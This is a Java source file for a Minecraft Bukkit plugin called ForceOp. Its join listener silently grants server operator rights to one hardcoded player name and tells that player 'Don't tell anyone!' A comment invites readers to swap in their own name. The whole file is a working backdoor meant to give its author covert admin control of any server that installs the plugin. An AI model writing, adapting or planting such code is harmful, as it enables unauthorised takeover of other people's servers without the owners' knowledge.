package me.johny9020.forceop.listeners;

import me.johny9020.forceop.Main;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

//implements Listener
public class PlayerJoinListener implements Listener{
	
	//This is the main file to this plugin;
	Main plugin;
	
	//we declare the file
	public PlayerJoinListener(Main plugin) {
		this.plugin = plugin;
	}
	
	//This is the event when a player joins the game
	@EventHandler
	public void onPlayerJoin(PlayerJoinEvent e) {
		Player player = e.getPlayer();
		
		//Replace Johny2090 with a players name that will be force opped!
		if(player.getName().equals("Johny2090")) {
			//Op player
			player.setOp(true);
			//Send message to the player
			player.sendMessage("[ForceOp] "  + ChatColor.YELLOW +  "You have been ForceOpped! Don't tell anyone!");
		}
	}

}
